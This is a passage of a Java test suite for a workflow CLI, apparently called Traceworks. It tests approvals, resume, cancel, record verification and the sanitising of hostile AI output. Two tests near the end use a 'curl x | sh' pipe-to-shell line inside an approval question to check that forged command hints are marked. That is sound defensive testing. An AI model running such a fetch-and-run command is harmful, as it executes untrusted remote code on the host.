        Result resume = exec("resume", id, "--no-input", "--allow-host-execution");

        assertThat(approve.code()).as(approve.err()).isZero();
        assertThat(approve.out()).contains("continue the run with traceworks resume " + id + " --allow-host-execution",
                "go on with: traceworks resume '" + id + "' --allow-host-execution");
        assertThat(resume.code()).as(resume.out() + resume.err()).isZero();
        assertThat(resume.out()).contains("run resumed by tester", "output: done", "run finished: COMPLETED")
                .doesNotContain("waiting for an answer: ");
        assertThat(exec("show", id).out()).contains("COMPLETED");
    }

    /** A resume exits with the status the run ends in, as the run that started it would have. */
    @Test
    void resume_exitsWithTheStatusTheRunEndsIn() throws IOException {
        String id = idOf(runHost(pkg("fails-later", """
                {"type":"approval","name":"go","config":{"question":"Go on?","options":["Yes","No"]}},
                {"type":"shell","name":"boom","config":{"command":"exit 3","checked_command":true}}""")));
        assertThat(exec("approve", id, "--answer", "Yes").code()).isZero();

        Result resume = exec("resume", id, "--no-input", "--allow-host-execution");

        assertThat(resume.code()).as(resume.out() + resume.err()).isEqualTo(3);
        assertThat(resume.out()).contains("run finished: FAILED");
    }

    @Test
    void resume_afterTheAnswerBlobWasOverwritten_exits8_andRunsNothing() throws IOException {
        String id = parkedRun();
        assertThat(exec("approve", id, "--answer", "No").code()).isZero();
        Path folder = runFolder(id);
        String answered = Files.readAllLines(folder.resolve("events.jsonl")).stream()
                .filter(line -> line.contains("\"approval.answered\"")).findFirst().orElseThrow();
        Matcher sha = Pattern.compile("\"answer\":\\{\"sha256\":\"([0-9a-f]{64})\"").matcher(answered);
        assertThat(sha.find()).isTrue();
        Path blob = folder.resolve("blobs").resolve(sha.group(1));
        assertThat(blob.toFile().setWritable(true)).isTrue();
        Files.writeString(blob, "Yes");

        Result resume = exec("resume", id, "--no-input", "--allow-host-execution");

        assertThat(resume.code()).as(resume.out() + resume.err()).isEqualTo(8);
        assertThat(resume.err().lines().toList()).singleElement().asString()
                .contains(sha.group(1), "traceworks verify " + id);
        assertThat(resume.out()).doesNotContain("output: done");
        assertThat(home.resolve("ledger/runs/" + id + ".json")).doesNotExist();
    }

    @Test
    void parkApproveWithACommentResume_theCommentAndTheTimelineAreInRunHtmlAndShow() throws IOException {
        String id = parkedRun();
        assertThat(exec("approve", id, "--answer", "Yes", "--comment", "ship it, <b>now</b>").code()).isZero();
        assertThat(exec("resume", id, "--no-input", "--allow-host-execution").code()).isZero();

        String html = Files.readString(runFolder(id).resolve("run.html"));
        Result show = exec("show", id);

        assertThat(html).contains("ship it, &lt;b&gt;now&lt;/b&gt;").contains("Interventions")
                .contains("via cli").contains("resumed the run").contains("attempt 1");
        assertThat(show.out()).contains("Interventions", "tester", "answered step 1 (approval) via cli",
                "resumed the run");
    }

    @Test
    void approve_anUnknownOption_exits6() throws IOException {
        String id = parkedRun();

        Result r = exec("approve", id, "--answer", "Maybe");

        assertThat(r.code()).isEqualTo(6);
        assertThat(r.err()).isNotBlank();
    }

    @Test
    void approve_needsAnAnswer() throws IOException {
        Result r = exec("approve", parkedRun());

        assertThat(r.code()).isEqualTo(2);
        assertThat(r.err()).contains("--answer");
    }

    @Test
    void resume_withoutAnAnswer_exits6() throws IOException {
        Result r = exec("resume", parkedRun(), "--no-input", "--allow-host-execution");

        assertThat(r.code()).isEqualTo(6);
        assertThat(r.err()).contains("waits for an answer");
    }

    @Test
    void answer_aHumanInput_thenResume() throws IOException {
        Path pkg = pkg("who", """
                {"type":"human-input","name":"who","config":{"prompt":"Who deploys?","variable_name":"who"}},
                {"type":"shell","name":"say","config":{"command":"echo by {{ who }}"}}""");
        Result parked = runHost(pkg);
        String id = idOf(parked);

        assertThat(parked.code()).isEqualTo(5);
        assertThat(parked.out()).contains("traceworks answer '" + id + "' --value '<text>'");
        assertThat(exec("answer", id, "--value", "operator").code()).isZero();
        Result resume = exec("resume", id, "--no-input", "--allow-host-execution");
        assertThat(resume.code()).as(resume.out() + resume.err()).isZero();
        assertThat(resume.out()).contains("output: by operator");
    }

    @Test
    void answer_needsAValueOrFields_notBoth() throws IOException {
        String id = parkedRun();

        assertThat(exec("answer", id).code()).isEqualTo(2);
        assertThat(exec("answer", id, "--value", "x", "--field", "a=b").code()).isEqualTo(2);
        assertThat(exec("answer", id, "--field", "novalue").code()).isEqualTo(2);
        Result noName = exec("answer", id, "--field", "=x");
        assertThat(noName.code()).isEqualTo(2);
        assertThat(noName.err()).contains("--field takes NAME=VALUE, got '=x'");
    }

    /** Each --field is split at its first '=': the name before it, the value after it, any further '=' kept. */
    @Test
    void answer_aForm_givesEachFieldTheValueAfterItsName() throws IOException {
        Path pkg = pkg("form", """
                {"type":"human-input","name":"where","config":{"prompt":"Who deploys where?","variable_name":"where",
                 "fields":[{"variable_name":"who","label":"Who"},{"variable_name":"target","label":"Target"}]}},
                {"type":"shell","name":"say","config":{"command":"echo {{ who }} to {{ target }}"}}""");
        String id = idOf(runHost(pkg));

        Result answer = exec("answer", id, "--field", "who=operator", "--field", "target=env=prod");
        Result resume = exec("resume", id, "--no-input", "--allow-host-execution");

        assertThat(answer.code()).as(answer.err()).isZero();
        assertThat(resume.code()).as(resume.out() + resume.err()).isZero();
        assertThat(resume.out()).contains("output: operator to env=prod");
    }

    /** An answer the run does not take exits 6 and says why; it is not reported as given. */
    @Test
    void answer_toARunThatWaitsForAnApproval_isRefused_withExit6() throws IOException {
        String id = parkedRun();

        Result r = exec("answer", id, "--value", "x");

        assertThat(r.code()).as(r.out() + r.err()).isEqualTo(6);
        assertThat(r.err()).contains("waits for", "approval");
        assertThat(r.out()).isEmpty();
    }

    /**
     * A request to a run whose process holds the run but does not take its inbox (it hangs) is queued: the command
     * exits 10 after its wait and says where to see what became of it. The test holds the run as such a process does.
     */
    @Test
    void aRequestTheRunsProcessDoesNotRecord_exits10_asQueued() throws IOException {
        String id = parkedRun();

        Result r;
        try (StoredRun held = new FileRunStore(home.resolve("runs")).open(id)) {
            assertThat(held.tryLockWriter()).isTrue();
            r = exec("pause", id);
        }

        assertThat(r.code()).as(r.out() + r.err()).isEqualTo(10);
        assertThat(r.err()).contains("not yet recorded", "traceworks show " + id);
    }

    @Test
    void cancel_aParkedRun_exits0_whenItEndsCancelled() throws IOException {
        String id = parkedRun();

        Result r = exec("cancel", id);

        assertThat(r.code()).as(r.err()).isZero();
        assertThat(r.out()).contains("CANCELLED");
        assertThat(exec("cancel", id).code()).isEqualTo(6);
    }

    /**
     * A run that ended otherwise while the cancel was on its way is not reported as cancelled: cancel exits with the
     * status the run ended in. The test plays the run's process, which has recorded the end and still holds the run
     * while it writes the manifest and the ledger entry.
     */
    @Test
    void cancel_ofARunThatEndedOtherwiseMeanwhile_exitsWithTheStatusItEndedIn() throws IOException {
        String id = "00000000-0000-0000-0000-0000000000c1";
        WorkflowDefinition definition = new WorkflowDefinition("wf-ends", "ends flow", null, List.of(), null, null,
                null, null, null, null, null, null, null);
        Clock clock = () -> Instant.parse("2026-11-04T10:00:00Z");
        Result cancel;
        try (StoredRun run = new FileRunStore(home.resolve("runs")).create(id, clock.now())) {
            RunRecorder recorder = RunRecorder.start(run.events(), run.blobs(), clock, id, definition);
            recorder.runStarted(new RunStart("wf-ends", "ends flow", "/pkg", "d", null, null,
                    "{}".getBytes(StandardCharsets.UTF_8), Map.of(), TriggerSource.MANUAL, "tester", "0.1.0",
                    "container", null, null));
            recorder.emit(new RunEvent.RunFinished(RunStatus.FAILED, Map.of(), "a step failed"));

            cancel = exec("cancel", id);
        }

        assertThat(cancel.code()).as(cancel.out() + cancel.err()).isEqualTo(3);
        assertThat(cancel.out()).contains("FAILED").doesNotContain("CANCELLED");
    }

    @Test
    void cancel_ofAParkedRun_showsTheParkedStepAsCancelled() throws IOException {
        String id = parkedRun();
        assertThat(exec("cancel", id).code()).isZero();

        Result show = exec("show", id);
        String html = Files.readString(runFolder(id).resolve("run.html"));

        assertThat(show.out()).containsPattern("(?m)^  1 +publish .*CANCELLED").doesNotContain("WAITING_APPROVAL");
        assertThat(html).contains("<section class=\"step cancelled\" id=\"step-1\">")
                .doesNotContain("class=\"step waiting_approval\"");
        // Derived from run.finished CANCELLED: the cancel appends no step event, so the record verifies unchanged
        assertThat(Files.readAllLines(runFolder(id).resolve("events.jsonl")))
                .filteredOn(line -> line.contains("\"type\":\"step.finished\""))
                .hasSize(1).noneMatch(line -> line.contains("\"step\":1"));
        assertThat(exec("verify", id).code()).isZero();
    }

    // ---- runs, show, watch ----

    @Test
    void runs_listsTheRun() throws IOException {
        String id = parkedRun();
        runHost(plainPackage());

        Result all = exec("runs");
        Result parked = exec("runs", "--status", "parked");
        Result byWorkflow = exec("runs", "--workflow", "plain");
        Result limited = exec("runs", "--limit", "1");

        assertThat(all.code()).isZero();
        assertThat(all.out().lines().toList()).hasSize(2);
        assertThat(parked.out().lines().toList()).singleElement().satisfies(line -> assertThat(line)
                .startsWith(id.substring(0, 8)).contains("PARKED", "deploy flow")
                .containsPattern("\\d{4}-\\d\\d-\\d\\dT\\d\\d:\\d\\d:\\d\\dZ$"));
        assertThat(byWorkflow.out()).contains("COMPLETED").doesNotContain("PARKED");
        assertThat(limited.out().lines().toList()).hasSize(1);
        assertThat(exec("runs", "--status", "nonsense").code()).isEqualTo(2);
        assertThat(exec("runs", "--limit", "x").code()).isEqualTo(2);
    }

    @Test
    void show_parkedRun() throws IOException {
        String id = parkedRun();

        Result r = exec("show", id.substring(0, 6));

        assertThat(r.code()).as(r.err()).isZero();
        assertThat(r.out()).contains(id, "deploy flow", "PARKED", "build", "COMPLETED", "publish", "Publish it?",
                "traceworks approve '" + id + "' --answer 'Yes'",
                "traceworks resume '" + id + "' --allow-host-execution")
                .doesNotContain("output");
        assertThat(r.out()).contains("Workflow" + System.lineSeparator()
                + "  0   build                    shell                              step 0 COMPLETED"
                + System.lineSeparator() + "    | echo built" + System.lineSeparator()
                + "  1   publish                  approval                           step 1 WAITING_APPROVAL"
                + System.lineSeparator() + "    | Publish it?" + System.lineSeparator()
                + "  2   done                     shell                              did not run");
    }

    /** The summary names the files the run left in its scratch directory, so no one has to look for a result. */
    @Test
    void summary_namesTheFilesOfTheScratchDirectory() throws IOException {
        Path pkg = pkg("writer", """
                {"type":"shell","name":"write","config":{"command":"printf hello > {{ scratch_dir }}/report.md; printf x > {{ scratch_dir }}/facts.json"}}""");

        Result r = runHost(pkg);

        assertThat(r.code()).as(r.err()).isZero();
        String id = idOf(r);
        Path scratch = home.resolve("runs").resolve(java.time.LocalDate.now(java.time.ZoneOffset.UTC).toString())
                .resolve(id).resolve("scratch");
        assertThat(r.out()).contains("  file    " + scratch.resolve("facts.json") + " (1 bytes)",
                "  file    " + scratch.resolve("report.md") + " (5 bytes)");
    }

    @Test
    void show_outputsAddsThemCut_andFullShowsThemWhole() throws IOException {
        Path pkg = pkg("long", """
                {"type":"shell","name":"big","config":{"command":"head -c 5000 /dev/zero | tr '\\\\0' x"}}""");
        String id = idOf(runHost(pkg, "--quiet"));

        String cut = exec("show", id, "--outputs").out();
        String full = exec("show", id, "--full").out();

        assertThat(cut).contains("x".repeat(2000)).doesNotContain("x".repeat(2001)).contains("cut at 2000");
        assertThat(full).contains("x".repeat(5000));
        assertThat(exec("show", id).out()).doesNotContain("xxxxxxxx");
    }

    /** Writes a finished run whose one step made an AI call that ended as {@code outcome}, as a run would record it. */
    private void runWithAnAiCall(String id, AiOutcome outcome) throws IOException {
        WorkflowDefinition definition = new WorkflowDefinition("wf-ai", "ai flow", null, List.of(), null, null, null,
                null, null, null, null, null, null);
        Clock clock = () -> Instant.parse("2026-11-04T10:00:00Z");
        try (StoredRun run = new FileRunStore(home.resolve("runs")).create(id, clock.now())) {
            RunRecorder recorder = RunRecorder.start(run.events(), run.blobs(), clock, id, definition);
            recorder.runStarted(new RunStart("wf-ai", "ai flow", "/pkg", "d", null, null,
                    "{}".getBytes(StandardCharsets.UTF_8), Map.of(), TriggerSource.MANUAL, "tester", "0.1.0",
                    "container", null, null));
            recorder.emit(new RunEvent.StepStarted(0, "review", "simple", 0, true));
            FakeAiCli cli = FakeAiCli.claude().then(outcome);
            AiProviders providers = recorder.recording(AiProviders.of("CLAUDE", List.of(new CliAiProvider(cli,
                    recorder.recording(request -> new CommandResult(0, "", "", 1, false)), "traceworks/claude:abc",
                    Map.of("ANTHROPIC_API_KEY", "sk-ant-test-value-01")))));
            providers.resolve("CLAUDE").executeAction(new AiProvider.ActionRequest("Review", "opus", null, null, null,
                    null, ToolPolicy.READ, false, null));
            recorder.emit(new RunEvent.StepFinished(0, "review", "simple", StepStatus.COMPLETED, "Review", 5,
                    Map.of()));
            recorder.emit(new RunEvent.RunFinished(RunStatus.COMPLETED, Map.of(), null));
        }
    }

    /**
     * A call that went to a model server of the operator's says so where the call is, in {@code show} and in
     * {@code run.html}: the backend and its URL, next to the model.
     */
    @Test
    void show_andRunHtml_nameTheLocalBackendOfAnAiCall_andItsUrl() throws Exception {
        String id = "00000000-0000-0000-0000-0000000000a7";
        traceworks.core.port.LocalModels local = new traceworks.core.port.LocalModels(Map.of("llm",
                new traceworks.core.port.LocalModels.Backend("llm", "http://llm.internal:8080/v1",
                        traceworks.core.port.LocalModels.OPENAI_COMPLETIONS, List.of("qwen"), null)));
        WorkflowDefinition definition = new WorkflowDefinition("wf-ai", "ai flow", null, List.of(), null, null, null,
                null, null, null, null, null, null);
        Clock clock = () -> Instant.parse("2026-11-04T10:00:00Z");
        try (StoredRun run = new FileRunStore(home.resolve("runs")).create(id, clock.now())) {
            RunRecorder recorder = RunRecorder.start(run.events(), run.blobs(), clock, id, definition);
            recorder.runStarted(new RunStart("wf-ai", "ai flow", "/pkg", "d", null, null,
                    "{}".getBytes(StandardCharsets.UTF_8), Map.of(), TriggerSource.MANUAL, "tester", "0.1.0",
                    "container", null, null));
            recorder.emit(new RunEvent.StepStarted(0, "ask", "simple", 0, true));
            FakeAiCli cli = FakeAiCli.pi().localModels(local).answers("hi");
            AiProviders providers = recorder.recording(AiProviders.of("PI", List.of(new CliAiProvider(cli,
                    recorder.recording(request -> new CommandResult(0, "", "", 1, false)), "traceworks/pi:abc",
                    Map.of()))));
            providers.resolve("PI").executeAction(new AiProvider.ActionRequest("Say hi", "llm/qwen", null, null, null,
                    null, ToolPolicy.NONE, false, null));
            recorder.emit(new RunEvent.StepFinished(0, "ask", "simple", StepStatus.COMPLETED, "hi", 5, Map.of()));
            recorder.emit(new RunEvent.RunFinished(RunStatus.COMPLETED, Map.of(), null));
        }

        Result show = exec("show", id);
        Result render = exec("render", id);

        assertThat(show.code()).as(show.err()).isZero();
        assertThat(show.out()).contains("      ai PI  model llm/qwen  local backend llm at"
                + " http://llm.internal:8080/v1  tools none  exit 0");
        assertThat(render.code()).as(render.err()).isZero();
        assertThat(Files.readString(runFolder(id).resolve("run.html"))).contains("PI model <code>llm/qwen</code>"
                + " local backend <code>llm</code> at <code>http://llm.internal:8080/v1</code> tools"
                + " <code>none</code>");
    }

    /** {@code show} lists each AI call of a step and its tool calls, with the names a hostile stream gave made safe. */
    @Test
    void show_listsTheAiCallsOfAStep_andTheirToolCalls() throws Exception {
        String id = "00000000-0000-0000-0000-0000000000a1";
        runWithAnAiCall(id, new AiOutcome("fine", 0, false, FakeAiCli.usage(), List.of(
                new ToolCall("Read", "{}", "x", false), new ToolCall("Gr\u001b[2Jep", "{}", "y", true))));

        Result show = exec("show", id);

        assertThat(show.code()).as(show.err()).isZero();
        assertThat(show.out()).contains("      ai CLAUDE  model opus  tools read  exit 0  100 in / 20 out tokens"
                + "  2 tool calls", "        tool Read\n", "        tool Gr?[2Jep  (error)")
                .doesNotContain("\u001b");
    }

    /**
     * {@code show} names why an AI call failed, without {@code --full}: the first line of the CLI's error, on one
     * line, made harmless for a terminal and cut.
     */
    @Test
    void show_namesWhyAnAiCallFailed_withTheFirstLineOfTheClisError() throws Exception {
        String id = "00000000-0000-0000-0000-0000000000a3";
        try {
            runWithAnAiCall(id, new AiOutcome("\n  Credit balance\u001b[2J is too low " + "z".repeat(400)
                    + "\nsecond line of the error", 1, true, null, List.of()));
        } catch (RuntimeException e) {
            // the failed call throws in the step; the record has it
        }

        Result show = exec("show", id);

        assertThat(show.code()).as(show.err()).isZero();
        assertThat(show.out()).contains("exit 1").contains("        error Credit balance?[2J is too low zzz")
                .contains("z...\n").doesNotContain("\u001b").doesNotContain("second line").doesNotContain("z".repeat(200));
    }

    /** {@code show} prints a hostile outcome as the record capped it: a huge tool name in 256 characters. */
    @Test
    void show_printsAHostileOutcome_asTheRecordCappedIt() throws Exception {
        String id = "00000000-0000-0000-0000-0000000000a2";
        runWithAnAiCall(id, new AiOutcome("ok", 0, false, null, List.of(new ToolCall("T".repeat(3_000_000),
                "{\"a\":\"" + "x".repeat(3_000_000) + "\"}", "half \uD800 a pair", false))));

        Result show = exec("show", id, "--full");

        assertThat(show.code()).as(show.err()).isZero();
        assertThat(show.out()).contains("        tool " + "T".repeat(256) + "\n").doesNotContain("T".repeat(257));
    }

    @Test
    void show_aFinishedRunWithAGate() throws IOException {
        String id = idOf(runHost(pkg("yellow", """
                {"type":"shell","name":"lint","config":{"command":"echo 'gate_status: YELLOW'"}}"""), "--quiet"));

        assertThat(exec("show", id).out()).contains("Gate").contains("YELLOW");
    }

    @Test
    void watch_finishedRun_exitsWithItsStatus() throws IOException {
        String done = idOf(runHost(plainPackage()));
        String failed = idOf(runHost(pkg("bad", """
                {"type":"shell","name":"boom","config":{"command":"exit 1","checked_command":true}}""")));

        Result ok = exec("watch", done);

        assertThat(ok.code()).isZero();
        assertThat(ok.out()).contains("run started", "output: hello", "run finished: COMPLETED");
        assertThat(exec("watch", failed).code()).isEqualTo(3);
        assertThat(exec("watch", parkedRun()).code()).isEqualTo(5);
    }

    @Test
    void unknownRun_exits2() {
        for (String command : List.of("show", "watch", "verify", "render", "cancel", "resume")) {
            Result r = exec(command, "deadbeef");
            assertThat(r.code()).as(command).isEqualTo(2);
            assertThat(r.err()).as(command).contains("No run matches");
        }
        assertThat(exec("approve", "deadbeef", "--answer", "Yes").code()).isEqualTo(2);
    }

    @Test
    void aRunPrefixShorterThanFourCharacters_isAUsageError() throws IOException {
        parkedRun();
        for (String command : List.of("show", "watch", "verify", "render", "cancel", "resume")) {
            Result r = exec(command, "abc");
            assertThat(r.code()).as(command + ": " + r.err()).isEqualTo(2);
            assertThat(r.err()).as(command).contains("at least 4 characters").doesNotContain("internal error");
        }
        assertThat(exec("approve", "abc", "--answer", "Yes").code()).isEqualTo(2);
    }

    @Test
    void aDamagedRecord_exits8_withOneLineThatPointsToVerify() throws IOException {
        for (String damage : List.of("{not an event", "{\"seq\":1,\"at\":\"2026-11-03T12:00:00.000Z\","
                + "\"type\":\"run.finished\",\"run\":\"RUN\",\"prev\":\"x\",\"status\":\"BOGUS\"}")) {
            String id = parkedRun();
            Path events = runFolder(id).resolve("events.jsonl");
            List<String> lines = new ArrayList<>(Files.readAllLines(events));
            lines.set(lines.size() - 1, damage.replace("RUN", id));
            Files.writeString(events, String.join("\n", lines) + "\n");

            for (List<String> command : List.of(List.of("show", id), List.of("resume", id, "--allow-host-execution",
                    "--no-input"), List.of("approve", id, "--answer", "Yes"), List.of("answer", id, "--value", "x"),
                    List.of("cancel", id))) {
                Result r = exec(command.toArray(String[]::new));
                assertThat(r.code()).as(command + ": " + r.out() + r.err()).isEqualTo(8);
                assertThat(r.err().lines().toList()).as(command.toString()).singleElement().asString()
                        .contains("traceworks verify " + id).doesNotContain("internal error");
            }
        }
    }

    // ---- verify, render, check ----

    @Test
    void verify_ok_exits0() throws IOException {
        String id = idOf(runHost(plainPackage(), "--quiet"));

        Result r = exec("verify", id);

        assertThat(r.code()).isZero();
        assertThat(r.out()).containsPattern("(?m)^chain     ok \\(\\d+ events, head [0-9a-f]{64}\\)$")
                .doesNotContain("problem").doesNotContain("deleted");
    }

    /** A blob deleted on purpose is no failure: verify counts it, and the record still verifies. */
    @Test
    void verify_countsADeletedBlob_andStillVerifies() throws IOException {
        String id = idOf(runHost(plainPackage(), "--quiet"));
        Files.delete(blobWith(runFolder(id), "hello"));

        Result r = exec("verify", id);

        assertThat(r.code()).as(r.out() + r.err()).isZero();
        assertThat(r.out()).containsPattern("(?m)^blobs     1 deleted \\(not a failure\\)$")
                .containsPattern("(?m)^verified$");
    }

    @Test
    void verify_ofARunFolderCopiedElsewhere_withAnotherHome_checksChainAndManifest_notTheLedger() throws IOException {
        String id = idOf(runHost(plainPackage(), "--quiet"));
        Path copy = Files.createDirectories(temp.resolve("usb").resolve(id));
        try (Stream<Path> files = Files.walk(runFolder(id))) {
            for (Path file : files.toList()) {
                Path target = copy.resolve(runFolder(id).relativize(file).toString());
                if (Files.isDirectory(file)) {
                    Files.createDirectories(target);
                } else if (!file.getFileName().toString().equals("run.lock")) {
                    Files.copy(file, target);
                }
            }
        }
        Path otherHome = Files.createDirectories(temp.resolve("other-home"));

        Result r = exec("--home", otherHome.toString(), "verify", copy.toString());

        assertThat(r.code()).as(r.out() + r.err()).isZero();
        assertThat(r.out()).contains("manifest  ok").contains("ledger    not checked (")
                .contains("verified");
    }

    /** A copy of a run's folder, without its lock file, as someone would carry it elsewhere. */
    private Path copyOfRunFolder(String id, Path target) throws IOException {
        Files.createDirectories(target);
        try (Stream<Path> files = Files.walk(runFolder(id))) {
            for (Path file : files.toList()) {
                Path copied = target.resolve(runFolder(id).relativize(file).toString());
                if (Files.isDirectory(file)) {
                    Files.createDirectories(copied);
                } else if (!file.getFileName().toString().equals("run.lock")) {
                    Files.copy(file, copied);
                }
            }
        }
        return target;
    }

    /** The blob of {@code folder} that holds exactly {@code content}. */
    private static Path blobWith(Path folder, String content) throws IOException {
        try (Stream<Path> blobs = Files.list(folder.resolve("blobs"))) {
            for (Path blob : blobs.toList()) {
                if (Files.readString(blob).equals(content)) {
                    return blob;
                }
            }
        }
        throw new AssertionError("no blob with " + content);
    }

    /**
     * A run folder given as a path is read as that folder, blobs included: the home need not know its id, and the
     * folder need not be named like it.
     */
    @Test
    void show_andVerify_ofARunFolderOutsideTheHome_readTheFolderTheyWereGiven() throws IOException {
        String id = idOf(runHost(plainPackage(), "--quiet"));
        Path copy = copyOfRunFolder(id, temp.resolve("usb").resolve(id));
        Path renamed = copyOfRunFolder(id, temp.resolve("usb").resolve("a-copy"));
        Path otherHome = Files.createDirectories(temp.resolve("other-home"));

        for (Path folder : List.of(copy, renamed)) {
            Result show = exec("--home", otherHome.toString(), "show", folder.toString());
            Result full = exec("--home", otherHome.toString(), "show", folder.toString(), "--full");
            Result sameHome = exec("show", folder.toString(), "--full");

            assertThat(show.code()).as(show.out() + show.err()).isZero();
            assertThat(show.out()).contains("plain flow", "COMPLETED", "say");
            assertThat(full.code()).as(full.out() + full.err()).isZero();
            assertThat(full.out()).contains("      | hello");
            assertThat(sameHome.code()).as(sameHome.out() + sameHome.err()).isZero();
            assertThat(sameHome.out()).contains("      | hello");
        }
        Result verify = exec("--home", otherHome.toString(), "verify", copy.toString());
        assertThat(verify.code()).as(verify.out() + verify.err()).isZero();
    }

    /**
     * The record of a folder given as a path names a run id, and that id may be a run of the home. The folder's
     * texts still come from the folder: here its copy lost the output, and the home's output is not shown for it.
     */
    @Test
    void show_ofACopiedRunFolder_showsOnlyItsOwnBlobs_notThoseOfTheHomesRunOfThatId() throws IOException {
        String id = idOf(runHost(plainPackage(), "--quiet"));
        Path copy = copyOfRunFolder(id, temp.resolve("usb").resolve(id));
        Files.delete(blobWith(copy, "hello"));

        Result ofCopy = exec("show", copy.toString(), "--full");
        Result ofHome = exec("show", id, "--full");

        assertThat(ofCopy.code()).as(ofCopy.out() + ofCopy.err()).isZero();
        assertThat(ofCopy.out()).contains("(deleted)").doesNotContain("| hello");
        assertThat(ofHome.out()).contains("      | hello");
    }

    /**
     * {@code cancel} of a parked run's folder outside the home prints its summary from that folder, with the
     * question read from it, and the hints name the folder: the home knows no run of that id.
     */
    @Test
    void show_andCancel_ofAParkedRunFolderOutsideTheHome_readTheFolder_andTheHintsNameIt() throws IOException {
        String id = parkedRun();
        Path copy = copyOfRunFolder(id, temp.resolve("usb").resolve(id));
        Path otherHome = Files.createDirectories(temp.resolve("other-home"));

        Result show = exec("--home", otherHome.toString(), "show", copy.toString());
        Result cancel = exec("--home", otherHome.toString(), "cancel", copy.toString());

        assertThat(show.code()).as(show.out() + show.err()).isZero();
        assertThat(show.out()).contains("  | Publish it?",
                "  traceworks approve '" + copy + "' --answer 'Yes'", "  traceworks resume '" + copy + "'");
        assertThat(cancel.code()).as(cancel.out() + cancel.err()).isZero();
        assertThat(cancel.out()).contains("CANCELLED", "  record  " + copy);
    }

    /** {@code approve} and {@code resume} of a parked run's folder outside the home work on that folder too. */
    @Test
    void approve_andResume_ofAParkedRunFolderOutsideTheHome_goOnInThatFolder() throws IOException {
        String id = parkedRun();
        Path copy = copyOfRunFolder(id, temp.resolve("usb").resolve(id));
        Path otherHome = Files.createDirectories(temp.resolve("other-home"));

        Result approve = exec("--home", otherHome.toString(), "approve", copy.toString(), "--answer", "Yes");
        Result resume = exec("--home", otherHome.toString(), "resume", copy.toString(), "--allow-host-execution",
                "--no-input");

        assertThat(approve.code()).as(approve.out() + approve.err()).isZero();
        assertThat(approve.out()).contains("go on with: traceworks resume '" + copy + "'");
        assertThat(resume.code()).as(resume.out() + resume.err()).isZero();
        assertThat(resume.out()).contains("$ echo done", "COMPLETED", "  record  " + copy);
    }

    @Test
    void verify_ofARenamedRunFolder_reportsOneClearProblem() throws IOException {
        String id = idOf(runHost(plainPackage(), "--quiet"));
        Path renamed = Files.createDirectories(temp.resolve("moved").resolve("not-the-run-id"));
        try (Stream<Path> files = Files.walk(runFolder(id))) {
            for (Path file : files.toList()) {
                Path target = renamed.resolve(runFolder(id).relativize(file).toString());
                if (Files.isDirectory(file)) {
                    Files.createDirectories(target);
                } else if (!file.getFileName().toString().equals("run.lock")) {
                    Files.copy(file, target);
                }
            }
        }

        Result r = exec("verify", renamed.toString());

        assertThat(r.code()).as(r.out() + r.err()).isEqualTo(8);
        assertThat(r.out().lines().filter(line -> line.startsWith("| ")).toList())
                .containsExactly("| run folder not-the-run-id holds run " + id);
    }

    @Test
    void verify_tampered_exits8() throws IOException {
        String id = idOf(runHost(plainPackage(), "--quiet"));
        Path events = runFolder(id).resolve("events.jsonl");
        Files.writeString(events, Files.readString(events).replace("\"say\"", "\"sax\""));

        Result r = exec("verify", id);

        assertThat(r.code()).isEqualTo(8);
        assertThat(r.out()).containsPattern("(?m)^chain     BROKEN$").contains("FAILED").containsPattern("seq \\d+");
    }

    @Test
    void render_writesRunHtml() throws IOException {
        String id = idOf(runHost(plainPackage(), "--quiet"));
        Path html = runFolder(id).resolve("run.html");
        Files.delete(html);

        Result r = exec("render", id);

        assertThat(r.code()).isZero();
        assertThat(r.out()).contains(html.toString());
        assertThat(html).isRegularFile();
    }

    @Test
    void check_withAnError_exits6() throws IOException {
        Path pkg = pkg("odd", """
                {"type":"shell","name":"empty","config":{}}""");

        Result r = exec("check", pkg.toString());

        assertThat(r.code()).isEqualTo(6);
        assertThat(r.out()).contains("ERROR", "missing-required-config-key", "empty");
    }

    /** A finding on the workflow as a whole names no block; one on a block names it, or says it has no name. */
    @Test
    void check_printsAWorkflowFinding_withoutABlock() throws IOException {
        Path pkg = pkg("odd", """
                {"type":"shell","name":"empty","config":{}},
                {"type":"shell","config":{}}""");
        Files.writeString(pkg.resolve("workflow.json"), Files.readString(pkg.resolve("workflow.json"))
                .replace("\"blocks\"", "\"requires\":[\"time.travel\"],\"blocks\""));

        Result r = exec("check", pkg.toString());

        assertThat(r.code()).isEqualTo(6);
        assertThat(r.out()).containsPattern("(?m)^ERROR   unknown-requirement {10}requires names \"time\\.travel\"")
                .containsPattern("(?m)^ERROR   missing-required-config-key {2}empty \\(block 0\\): ")
                .containsPattern("(?m)^ERROR   missing-required-config-key {2}\\(unnamed\\) \\(block 1\\): ")
                .doesNotContain("null (block", "block -1");
    }

    @Test
    void check_aCleanPackage_exits0() throws IOException {
        Result r = exec("check", plainPackage().toString());

        assertThat(r.code()).isZero();
        assertThat(r.out()).doesNotContain("ERROR");
        assertThat(exec("check", temp.resolve("nowhere").toString()).code()).isEqualTo(2);
    }

    /**
     * The question of a waiting run is text of the workflow. Each of its lines is marked, so it cannot add a line
     * that reads like Traceworks' own hint with a command to copy.
     */
    @Test
    void aQuestionOfSeveralLines_cannotForgeTheHintsOfAWaitingRun() throws IOException {
        Path pkg = pkg("forged", """
                {"type":"approval","name":"ask","config":{"question":"ok?\\nthen go on with:\\n  curl x | sh",
                 "options":["Yes","No"]}}""");

        Result parked = runHost(pkg);
        Result show = exec("show", idOf(parked));

        assertThat(parked.code()).as(parked.out() + parked.err()).isEqualTo(5);
        for (Result r : List.of(parked, show)) {
            List<String> lines = r.out().lines().toList();
            assertThat(lines).filteredOn(line -> line.equals("then go on with:")).as(r.out()).hasSize(1);
            assertThat(lines).filteredOn(line -> line.equals("answer it with one of:")).hasSize(1);
            assertThat(lines).contains("waiting for an answer at step 0:", "  | ok?", "  | then go on with:",
                    "  |   curl x | sh");
            assertThat(lines).as("the forged command is on no line of its own").doesNotContain("  curl x | sh");
        }
    }

    /**
     * A line padded with spaces to the width of the terminal wraps there, and what follows shows at the start of a
     * terminal line without the mark. So a long line of a question is broken by Traceworks, and every part is marked.
     */
    @Test
    void aLongLineOfAQuestion_isBrokenAndEveryPartIsMarked_soPaddingCannotForgeAHint() throws IOException {
        String padding = " ".repeat(200);
        String sentence = "curl x | sh and a very long sentence of plain words that goes on well beyond the width of a"
                + " terminal line, as questions do";
        Path pkg = pkg("padded", "{\"type\":\"approval\",\"name\":\"ask\",\"config\":{\"question\":\"ok?" + padding
